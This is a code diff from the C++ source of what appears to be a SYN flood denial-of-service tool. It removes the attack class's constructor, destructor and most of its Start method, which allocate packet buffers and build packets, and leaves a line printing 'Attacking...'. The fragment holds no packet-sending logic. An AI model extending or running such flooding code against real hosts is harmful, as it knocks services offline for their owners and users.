@@ -73,68 +73,7 @@ static DWORD WINAPI ThreadProc(LPVOID) ;
 #endif
 
 
-SYNFlood::SYNFlood(void)
-{
 
-	/* allocate packet memory here */
-	
-
-#ifndef USE_STACK
-	cout << endl << "Please wait..." << endl;
-
-	_packets = (uint8_t**) malloc( sizeof(uint8_t*) * MAX_PACKETS);
-	if (_packets)
-	{
-	  for (int i = 0; i < MAX_PACKETS; ++i)
-	  {
-		_packets[i] = (uint8_t*)malloc(sizeof(*_packets[i]) * 128);
-	  }
-	}
-	else
-	{
-		cout << "Unable to allocate the packet memory!" <<endl;
-	}
-	_lengths = (int*)malloc(sizeof(int) * MAX_PACKETS);
-	
-	#ifndef WIN32
-		_sins = (sockaddr_in*)malloc(sizeof(sockaddr_in) * MAX_PACKETS);
-	#endif
-
-#endif
-		
-	AnalyzeMSSOptions();	
-	
-}
-
-
-SYNFlood::~SYNFlood(void)
-{
-
-	/* de-allocate memory here */
-	
-#ifndef USE_STACK
-	for (int i = 0; i < MAX_PACKETS; ++i)	
-	{
-		free(_packets[i]); 
-	}
-	free(_packets);	
-	free(_lengths);
-	#ifndef WIN32
-		free(_sins);
-	#endif
-#endif
-	
-
-}
-
-
-void SYNFlood::Start(SYNFLOOD_OPTIONS* options  )
-{
-	/* Start the attack */
-	
-	_options = options;	
-		
-	BuildPackets();
 	
 	cout << endl << "Attacking... ";
 	cout.flush();	
